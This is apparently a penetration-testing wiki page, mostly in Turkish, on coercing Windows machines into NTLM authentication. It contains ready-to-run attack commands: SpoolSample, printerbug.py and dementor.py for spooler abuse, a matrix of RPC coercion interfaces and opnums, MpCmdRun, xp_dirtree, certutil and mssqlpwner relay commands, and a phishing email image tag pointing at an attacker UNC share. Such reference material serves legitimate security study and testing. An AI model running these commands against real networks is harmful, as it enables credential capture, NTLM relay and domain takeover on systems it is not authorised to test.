# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.

## Spooler Service Abuse

If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
Dikkat edin: yazıcı bildirimi rastgele bir sisteme gönderdiğinde, o **sisteme karşı kimlik doğrulaması** yapması gerekir. Bu nedenle bir saldırgan, _**Print Spooler**_ servisinin rastgele bir sisteme kimlik doğrulaması yapmasını sağlayabilir ve servis bu kimlik doğrulamasında **bilgisayar hesabını** kullanacaktır.

### Finding Windows Servers on the domain

Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler servislerinin dinlemede olup olmadığını bulma

Biraz değiştirilmiş @mysmartlogin'in (Vincent Le Toux'un) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) aracını kullanarak Spooler Service'in dinlemede olup olmadığını kontrol edin:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Ayrıca Linux'ta rpcdump.py kullanabilir ve MS-RPRN Protocol için arama yapabilirsiniz.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Hizmetin rastgele bir hosta kimlik doğrulaması yapmasını isteyin

Şunu derleyebilirsiniz: [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
veya Linux'taysanız [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) veya [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) kullanın
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Unconstrained Delegation ile Birleştirme

Eğer bir saldırgan zaten [Unconstrained Delegation](unconstrained-delegation.md) olan bir bilgisayarı ele geçirmişse, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Unconstrained delegation nedeniyle, yazıcının bilgisayar hesabının **TGT**'si unconstrained delegation olan bilgisayarın **belleğinde saklanacaktır**. Saldırgan bu hostu zaten ele geçirmiş olduğundan, bu bileti **alabilecek** ve kötüye kullanabilecektir ([Pass the Ticket](pass-the-ticket.md)).

## RPC Kimlik Doğrulamayı Zorlama

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / PrintNightmare-family
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Opnum: 0 RpcAsyncOpenPrinter
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Not: Bu yöntemler, UNC yolunu taşıyabilecek parametreleri kabul eder (ör. `\\attacker\share`). İşlendiklerinde, Windows belirtilen UNC'ye (makine/kullanıcı bağlamında) kimlik doğrulaması yapar; bu NetNTLM yakalama veya relay yapılmasına olanak sağlar.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Arayüz: MS-EVEN, \\PIPE\\even üzerinden (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Etki: hedef sağlanan yedek günlük yolunu açmayı dener ve saldırgan kontrollü UNC'ye kimlik doğrular.
- Pratik kullanım: Tier 0 varlıkları (DC/RODC/Citrix/etc.) NetNTLM yayımlamaya zorlayın, ardından AD CS uç noktalarına (ESC8/ESC11 senaryoları) veya diğer ayrıcalıklı servislerde relay yapmak için kullanın.

## PrivExchange

`PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir hatadan kaynaklanır. Bu özellik, posta kutusuna sahip herhangi bir domain kullanıcısının Exchange sunucusunu herhangi bir istemci tarafından sağlanan hosta HTTP üzerinden kimlik doğrulamaya zorlamasına izin verir.

Varsayılan olarak, **Exchange service runs as SYSTEM** ve fazladan ayrıcalıklar verilir (özellikle, **2019 öncesi Cumulative Update'te domain üzerinde WriteDacl ayrıcalığına sahiptir**). Bu hata, bilgilerin **LDAP'a relay edilmesi ve sonucunda domain NTDS veritabanının çıkarılması** için kullanılabilir. LDAP'a relay mümkün olmadığında bile, bu hata domain içindeki diğer hostlara relay ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı şekilde kullanılması, doğrulanmış herhangi bir domain kullanıcı hesabıyla anında **Domain Admin** erişimi sağlar.

## Windows İçinde

Eğer zaten Windows makinesinin içindeyseniz, Windows'un ayrıcalıklı hesaplarla bir sunucuya bağlanmasını şu araçlarla zorlayabilirsiniz:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ya da bu diğer tekniği kullanın: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

NTLM kimlik doğrulamasını zorlamak için certutil.exe lolbin (Microsoft-signed binary) kullanmak mümkündür:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Eğer ele geçirmek istediğiniz bir makineye giriş yapan kullanıcının **email address**'ini biliyorsanız, ona aşağıdakine benzer bir **email with a 1x1 image** gönderebilirsiniz:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
ve o açtığında kimlik doğrulamaya çalışacaktır.

### MitM

Eğer bir bilgisayara MitM attack gerçekleştirebilir ve görüntülediği sayfaya HTML inject edebilirseniz, sayfaya aşağıdaki gibi bir image inject etmeyi deneyebilirsiniz:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM kimlik doğrulamasını zorlamak ve oltalamak için diğer yollar


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1'i Kırmak

Eğer [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack) yakalayabiliyorsanız.\
_NTLMv1'i kırmak için Responder challenge değerini "1122334455667788" olarak ayarlamanız gerektiğini unutmayın_

## Referanslar
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
